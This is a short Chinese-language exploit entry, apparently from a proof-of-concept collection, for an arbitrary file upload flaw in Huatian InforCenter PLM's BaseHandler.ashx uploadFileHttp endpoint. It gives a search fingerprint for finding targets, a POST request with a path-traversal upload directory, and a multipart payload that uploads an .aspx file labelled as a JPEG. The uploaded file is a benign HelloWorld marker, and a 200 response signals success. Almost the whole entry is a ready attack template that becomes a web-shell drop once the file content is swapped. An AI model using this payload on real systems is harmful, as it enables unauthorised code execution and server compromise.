# 华天InforcenterPLMuploadFileHttp存在任意文件上传漏洞

华天 ｜ 命令执行 ｜ —
- **指纹**：`body="/Base/BaseHandler.ashx"`
- **请求**：`POST /Base/BaseHandler.ashx?type=uploadFileHttp&uploadPath=../Files/ HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryNxj6ATqxnclLfnCL
Content-Disposition: form-data; name="file"; filename="hello.aspx"
Content-Type: image/jpeg
<%= "HelloWorld" %>
------WebKitFormBoundaryNxj6ATqxnclLfnCL--
```
- **响应特征**：200